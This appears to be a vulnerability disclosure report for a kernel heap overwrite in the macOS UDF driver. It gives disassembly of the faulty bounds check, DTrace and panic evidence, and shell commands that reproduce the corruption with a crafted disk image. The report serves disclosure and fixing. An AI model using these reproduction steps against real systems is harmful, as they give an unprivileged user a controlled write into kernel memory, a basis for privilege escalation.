# UDF AppendAllocDesc tail-capacity mismatch gives uid501 a controlled adjacent kernel-heap overwrite

## Summary

On macOS 27.0 beta `26A5416b`, a non-root uid501 user can mount a valid,
read-write UDF image and extend an owned file so that
`UDFAllocDesc::AppendAllocDesc` appends a short allocation descriptor to an
Extended File Entry (EFE). The function checks the descriptor size against
space measured from the *previous descriptor offset*, but later writes from
the *next descriptor offset*. When the EFE has `L_EA=0x124`, `L_AD=0`, and a
512-byte block, this check reports 12 bytes available even though only four
bytes remain at the actual append address.

The accepted eight-byte short allocation descriptor starts at offset `0x1fc`.
Its first dword is in bounds at `0x1fc..0x1ff`; its second dword is stored at
`0x200..0x203`, four bytes into the adjacent kernel allocation. That second
dword is the logical block number selected by the image's UDF Space Bitmap
Descriptor.

Two diagnostic boots demonstrate value control:

```text
default bitmap:     freed-neighbor offset 0 = 0x00000023
modified bitmap:    freed-neighbor offset 0 = 0x00000040
```

The second full panic reports:

```text
[data_shared.kalloc.512]: element modified after free
(off:0, val:0x0000000000000040, sz:512, ptr:0xfffffe30c27a2e00)
    0: 0x0000000000000040
Panicked task: pid 1137: sync
```

The UDF Space Bitmap Descriptor is the only input changed between these
captures. DTrace independently records `AppendAllocDesc` returning success
after writing `dword1=0x40` at `data+0x200` on four distinct 512-byte block
buffers.

## Root cause

The constructor computes and stores the allocation-descriptor start:

```text
UDFAllocDesc::UDFAllocDesc
0xfffffe000ba870f4  mov   w10,#0xd8          ; EFE fixed header
0xfffffe000ba87114  ldr   w8,[x9,x11]        ; L_EA = 0x124
0xfffffe000ba87118  add   x8,x10,x8          ; 0xd8 + 0x124
0xfffffe000ba8711c  sub   x8,x8,x24
0xfffffe000ba87120  str   w8,[x19,#0x30]     ; ADStart = 0x1fc
```

It validates only the already-present allocation-descriptor span:

```text
0xfffffe000ba87180  ldr   w22,[x9,x12]       ; L_AD = 0
0xfffffe000ba87184  ldr   w12,[x1,#0x30]     ; block size = 512
0xfffffe000ba87188  add   w13,w22,w8         ; ADStart + L_AD = 508
0xfffffe000ba8718c  cmp   w13,w12
0xfffffe000ba87190  b.ls  accept
```

That guard is correct for parsing the existing zero-length AD area, but it
does not reserve space for a later appended descriptor.

For an empty short-AD list in the same partition,
`AppendAllocDesc` derives `previousOffset=ADStart-8=500` and
`descriptorSize=8`:

```text
UDFAllocDesc::AppendAllocDesc
0xfffffe000ba88210  mov   w8,#-8
0xfffffe000ba8822c  ldr   w10,[x19,#0x30]    ; ADStart = 508
0xfffffe000ba88230  add   w27,w8,w10         ; previousOffset = 500
0xfffffe000ba88260  csel  x24,x12,x10,eq     ; descriptorSize = 8
```

The only tail-capacity comparison subtracts `previousOffset`, not the actual
write offset:

```text
0xfffffe000ba88278  sub   w9,w11,w27         ; 512 - 500 = 12
0xfffffe000ba88284  cmp   x24,x9              ; 8 <= 12
0xfffffe000ba88288  b.ls  accept
```

There is no comparison of either of these required forms before the sink:

```text
appendOffset + descriptorSize <= blockSize
descriptorSize <= blockSize - appendOffset
```

The write path later advances by the descriptor size and uses that result as
the descriptor pointer:

```text
0xfffffe000ba88514  add   w21,w27,w24        ; appendOffset = 508
0xfffffe000ba88524  ldr   x8,[sp,#0xb0]      ; 512-byte block data
0xfffffe000ba8852c  add   x4,x8,x21          ; data + 0x1fc
0xfffffe000ba88538  ldur  w2,[x29,#-0x54]    ; allocated logical block
0xfffffe000ba8854c  bl    UDFUnifiedAllocDesc::SetAllocDesc
```

The exact short-AD sink is:

```text
UDFUnifiedAllocDesc::SetAllocDesc
0xfffffe000ba8cfb8  ldrb  w9,[x0,#8]
0xfffffe000ba8cfc0  tbz   w9,#0,long_form
0xfffffe000ba8cfc4  mov   x9,x3
0xfffffe000ba8cfc8  bfi   w9,w4,#30,#2
0xfffffe000ba8cfcc  stp   w9,w2,[x8]
```

Operand audit for this sink:

- Destination base `x8` is `blockData + appendOffset`.
- `blockData` has a 512-byte allocation, confirmed by DTrace
  `buf_size=512`, `buf_count=512`.
- `appendOffset` is 508 and is not jointly checked with the eight-byte sink.
- The first value is the encoded extent length/flags (`0xc0000200`).
- The second value is the attacker-selected allocated logical block number.
- The constructor's `ADStart+L_AD <= blockSize` guard and the appender's
  `descriptorSize <= blockSize-previousOffset` guard bound different spans;
  neither bounds the actual eight-byte store from `appendOffset`.

## Attacker control

The supplied `firstfree40` image marks logical blocks 35 through 63 allocated
in the UDF Space Bitmap Descriptor and leaves block 64 free. During the
uid501 file extension, `UDFMount::AllocExtent` therefore returns logical block
`0x40`. `AppendAllocDesc` reloads that value and passes it as `w2` to the
eight-byte `stp`.

The narrow trace records:

```text
APPEND entry ... ad_start=0x1fc total_bytes=0 block_size=512
READBLOCK return ... data=fffffe30c27a0c00 buf_size=512 buf_count=512
APPEND return err=0 data=fffffe30c27a0c00
              dword0=0xc0000200 dword1=0x40
```

Thus `dword0` occupies block offsets `0x1fc..0x1ff`, while `dword1=0x40`
occupies `data+0x200`, the first dword of the adjacent allocation.

A separate multi-cycle trace records successful `dword1=0x40` writes for
buffers ending in `...1e00`, `...3600`, `...0c00`, and `...1a00`. The
subsequent PGZ panic reports the same value at offset zero of the adjacent
freed `data_shared.kalloc.512` element at `...2e00`.

The earlier default-bitmap image independently produced `0x23` at the same
adjacent-element offset. Changing the on-disk free-space map therefore changes
the value written across the allocation boundary.

## Reachability and environment

- Triggering identity: uid501, no `sudo`.
- Trigger: attach the supplied UDF image read-write, then extend the owned
  `/Volumes/UDFEMBED/target` file to 4097 bytes and call `sync`.
- OS: macOS 27.0 beta `26A5416b`.
- Kernel: `xnu-13432.1.9~3/RELEASE_ARM64_VMAPPLE`.
- UDF kext UUID: `FFD0DBD5-1C5D-35FD-B1BE-7F68B06A5911`.
- Diagnostic VM: SIP and Authenticated Root disabled; boot args
  `-zp keepsyms=1 amfi_get_out_of_my_way=1`.
- A separate stock `26A5416b` SIP-on/empty-boot-args VM confirmed that uid501
  can attach the image read-write and reach the file-extension path. The
  allocator-corruption captures use `-zp` because normal allocator behavior
  need not detect the adjacent overwrite immediately.

## Reproduction

The ready-made `firstfree40` image is supplied. On a disposable diagnostic
VM:

```sh
hdiutil attach -readwrite udf_ad_capacity_underflow_firstfree40.raw.dmg
truncate -s 4097 /Volumes/UDFEMBED/target
sync
```

Repeat from fresh copies if allocator detection does not fire on the first
cycle. The included `run_udf_adcap_cycles.sh` automates bounded fresh-image
cycles. The supplied panic was detected after seven cycles.

To regenerate either image from the original valid UDF fixture:

```sh
clang -O2 -Wall -Wextra patch_efe_ad_capacity_underflow.c \
  -o patch_efe_ad_capacity_underflow
./patch_efe_ad_capacity_underflow base.raw.dmg output.raw.dmg 0x40
```

The optional final argument chooses the first free logical block encoded by
the image's Space Bitmap Descriptor.

## Impact statement

Proven: a uid501-controlled four-byte value written at fixed offset zero of
the adjacent kernel allocation, with allocator-confirmed corruption of a
freed `data_shared.kalloc.512` element and two independently selected values.

Not claimed: attacker-selected destination address, corruption of a chosen
live object, control-flow hijack, or a complete privilege-escalation chain.

## Distinctness from the earlier UDF AD-length-wrap issue

This is not the embedded-allocation-descriptor length-wrap finding. Here:

- `InformationLength=0` and `L_AD=0`;
- `ADStart+L_AD=508`, with no arithmetic wrap;
- the constructor's existing-span check passes correctly;
- the vulnerable function is `UDFAllocDesc::AppendAllocDesc`;
- the missing invariant is tail capacity for a newly appended descriptor;
- the sink is the short-AD `stp w9,w2,[x8]` across a 512-byte block boundary.

The earlier issue instead used a 32-bit `ADStart+L_AD` wrap in the embedded to
non-embedded conversion path. The functions, malformed fields, invariant, and
write sink are different.

## Evidence guide

- `udf_adcap_firstfree40_142757.panic`: strongest controlled `0x40` panic.
- `udf_adcap_142259.panic`: independent default-bitmap `0x23` panic.
- `UDF_ADCAP_FIRSTFREE40_DTRACE_26A5416b.log`: exact single-write geometry.
- `UDF_ADCAP_FIRSTFREE40_CYCLES_DTRACE_26A5416b.log`: four distinct successful
  `0x40` writes.
- `STATIC_RULE_ZERO_EXCERPT.txt`: constructor, check, address calculation, and
  exact sink.
- `patch_efe_ad_capacity_underflow.c`: checksum-preserving image mutator.
- `trace_udf_adcap.d`: diagnostic trace source.
- `run_udf_adcap_cycles.sh`: bounded allocator-detection runner.

